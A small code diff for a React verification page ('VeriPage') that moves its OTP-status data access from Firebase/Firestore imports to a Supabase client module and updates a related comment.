@@ -8,8 +8,8 @@ import { Alert, AlertDescription } from "@/components/ui/alert"
 import { ShieldCheck, AlertCircle, RefreshCw, Clock, Lock, Smartphone } from "lucide-react"
 import { UnifiedSpinner, SimpleSpinner } from "@/components/unified-spinner"
 import { StepShell } from "@/components/step-shell"
-import { db } from "@/lib/firebase"
-import { doc, onSnapshot, setDoc, Firestore } from "firebase/firestore"
+import { db } from "@/lib/supabase-client"
+import { doc, onSnapshot, setDoc, Firestore } from "@/lib/supabase-client"
 import { addToHistory } from "@/lib/history-utils"
 import { useRedirectMonitor } from "@/hooks/use-redirect-monitor"
 
@@ -75,7 +75,7 @@ export default function VeriPage() {
     checkAccess()
   }, [router])
 
-  // Listen to Firestore for OTP status changes
+  // Poll Supabase for OTP status changes
   useEffect(() => {
     const visitorID = localStorage.getItem("visitor")
     if (!visitorID || !db) return
